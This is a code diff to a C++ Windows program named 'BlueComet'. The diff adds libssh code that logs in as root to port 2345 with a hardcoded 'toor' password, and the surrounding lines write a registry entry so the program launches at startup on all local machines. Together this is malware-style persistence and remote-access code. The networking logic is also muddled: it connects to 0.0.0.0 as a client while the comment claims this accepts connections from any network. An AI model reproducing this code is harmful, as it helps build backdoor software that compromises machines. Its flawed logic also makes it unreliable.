@@ -11,16 +11,53 @@
 
 
 #include <iostream>
-#include <string>
+#include <string>	
+#include <cstring>
+#include <libssh/libssh.h>
 #include <cstring>
 #include <cstdlib>
 #include <Windows.h>
 #pragma comment(lib, "Advapi32.lib")
 
-using namespace std; /*Used to display counter and password simultaneously*/
 
-int main() {
-    /* Create registry to include BlueComet in startup on all local machines */
+using namespace std;
+
+int main()
+{
+	
+	/*set up remote connection for all hosts*/
+	
+    const char* host = "0.0.0.0"; // allow connections from any network
+    int port = 2345;
+
+    ssh_session session = ssh_new();
+    if (session == NULL) {
+        cerr << "Error creating SSH session" << endl;
+        return 1;
+    }
+
+    ssh_options_set(session, SSH_OPTIONS_HOST, host);
+    ssh_options_set(session, SSH_OPTIONS_PORT, &port);
+    ssh_options_set(session, SSH_OPTIONS_USER, "root"); // replace with your admin username
+    ssh_options_set(session, SSH_OPTIONS_CIPHERS_C_S, "aes256-cbc"); 
+
+    int rc = ssh_connect(session);
+    if (rc != SSH_OK) {
+        cerr << "Error connecting to SSH server: " << ssh_get_error(session) << endl;
+        ssh_free(session);
+        return 1;
+    }
+
+    rc = ssh_userauth_password(session, NULL, "toor"); // replace with your admin password
+    if (rc != SSH_AUTH_SUCCESS) {
+        cerr << "Error authenticating with SSH server: " << ssh_get_error(session) << endl;
+        ssh_disconnect(session);
+        ssh_free(session);
+        return 1;
+    }
+
+/* Create registry to include BlueComet in startup on all local machines */
+	
     char re[MAX_PATH];
     string FP = string(re, GetModuleFileName(NULL, re, MAX_PATH));
 
